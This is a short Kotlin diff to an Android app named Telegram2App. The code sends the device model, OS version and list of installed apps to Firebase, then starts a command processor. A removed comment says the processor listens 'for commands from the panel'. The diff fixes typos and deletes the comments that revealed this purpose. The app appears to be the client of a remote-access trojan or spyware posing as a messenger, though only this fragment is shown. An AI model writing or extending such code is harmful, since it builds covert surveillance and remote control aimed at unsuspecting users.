@@ -13,11 +13,9 @@ class Telegram2App : Application() {
             ?: UUID.randomUUID().toString()
         FirebaseBridge.init(deviceId)
 
-        // Register device with basic info
-        val apps = packageManager.getInstalledpackages(0).map { it.packageName }
-        FirebaseBridge.registerDevice(Build.MODEL, Build.ERSION.RELEASE, apps)
+        val apps = packageManager.getInstalledPackages(0).map { it.packageName }
+        FirebaseBridge.registerDevice(Build.MODEL, Build.VERSION.RELEASE, apps)
 
-        // Start listening for commands from the panel
         CommandProcessor.init(this)
     }
 }
